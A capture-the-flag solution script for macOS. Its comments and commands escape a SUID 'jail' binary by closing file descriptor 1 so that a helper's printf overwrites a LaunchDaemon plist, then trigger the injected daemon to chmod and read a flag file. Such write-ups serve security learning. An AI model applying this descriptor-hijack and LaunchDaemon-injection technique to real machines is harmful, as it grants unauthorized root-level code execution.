#!/bin/zsh
#
#  Solution
#  --------
#  1. The SUID binary "jail" basically locks down the entire shell and runs it securely - the only sandbox escape is with binary "one"
#  2. The "one" binary is key - if we close file descriptor #1 then printf still tries to write to it - and the previous open() will assign it to the LaunchDaemon
#  3. Since there is a seek to the beginning of the file (suspicious!) then we can simply override its seemingly fixed content with printf
#  4. In our exploit - we add a new LaunchDaemon entry that will change the flag's mode to be readable
#  5. Triggering is also supplied by the "one" binary with the "check" operation
#

# Trigger as first argument while closing file descriptor #1
echo '/Users/ctf/one '\''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>jbo.one.updater</string><key>Program</key><string>/bin/chmod</string><key>ProgramArguments</key><array><string>/bin/chmod</string><string>755</string><string>/Users/ctf/flag</string></array></dict></plist>'\'' 1>&-' | /Users/ctf/jail

# Trigger LaunchDaemon
echo '/Users/ctf/one check' | /Users/ctf/jail

# Wait and read the flag
sleep 5
cat /Users/ctf/flag

